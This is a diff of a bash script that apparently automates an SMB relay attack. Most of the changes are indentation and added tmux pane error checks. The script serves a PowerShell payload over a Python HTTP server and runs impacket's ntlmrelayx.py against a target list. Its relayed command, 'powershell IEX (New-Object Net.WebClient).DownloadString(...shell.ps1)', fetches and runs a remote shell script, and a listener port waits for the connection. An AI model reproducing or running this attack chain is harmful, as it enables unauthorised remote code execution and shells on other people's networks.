@@ -224,8 +224,8 @@ function checkResponderConfig(){
 
 function relayingAttack(){
 
-    which tmux &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} tmux not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+   	which tmux &>/dev/null
+   	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} tmux not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
 
@@ -236,6 +236,7 @@ function relayingAttack(){
 	tmux new-session -d -t "smbautorelay"
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create Tmux session 'smbautorelay'. Existing...\n"; badExit; else sleep 0.5; fi
 	tmux rename-window "smbautorelay" && tmux split-window -h
+	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
 
 	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
 	if [ $? -ne 0 ];then let paneID+=1; tmux select-pane -t $paneID; fi
@@ -269,12 +270,14 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
 	
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python3 -m http.server" C-m && sleep 1 && tmux split-window
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
-
-    test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
 	
-    command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
+	
+	test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
+    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+	
+    	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
